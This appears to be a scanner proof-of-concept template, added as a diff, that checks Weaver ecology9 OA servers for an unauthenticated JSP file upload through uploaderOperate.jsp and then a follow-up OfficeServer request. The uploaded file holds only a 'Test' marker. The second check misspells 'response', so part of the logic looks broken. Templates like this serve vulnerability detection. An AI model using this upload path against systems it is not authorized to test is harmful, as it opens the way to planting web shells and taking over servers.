@@ -1,0 +1,44 @@
+name: ecology9-uploaderOperate-file-upload
+transport: http
+set:
+  r1: b"\x0D"
+rules:
+  r0:
+    request:
+      method: POST
+      path: /workrelate/plan/util/uploaderOperate.jsp
+      body: |
+        ------WebKitFormBoundaryAe9cgNtm0PTABns7{{r1}}
+        Content-Disposition: form-data; name="secId"{{r1}}
+        {{r1}}
+        1{{r1}}
+        ------WebKitFormBoundaryAe9cgNtm0PTABns7{{r1}}
+        Content-Disposition: form-data; name="plandetailid"{{r1}}
+        {{r1}}
+        1{{r1}}
+        ------WebKitFormBoundaryAe9cgNtm0PTABns7{{r1}}
+        Content-Disposition: form-data; name="Filedata"; filename="testlog.jsp"{{r1}}
+        {{r1}}
+        Test{{r1}}
+        ------WebKitFormBoundaryAe9cgNtm0PTABns7--{{r1}}
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAe9cgNtm0PTABns7
+    expression: response.status == 200
+  r1:
+    request:
+      method: POST
+      path: /OfficeServer
+      body: |
+        ------WebKitFormBoundarymVk33liI64J7GQaK{{r1}}
+        Content-Disposition: form-data; name="aaa"{{r1}}
+        {{r1}}
+        {'OPTION':'INSERTIMAGE','isInsertImageNew':'1','imagefileid4pic':'20462'}{{r1}}
+        ------WebKitFormBoundarymVk33liI64J7GQaK--{{r1}}
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymVk33liI64J7GQaK
+    expression: resoponse.status == 200
+expression: r0() && r1()
+detail:
+  author: trganda
+  links:
+    - https://www.weaver.com.cn/cs/securityDownload.asp
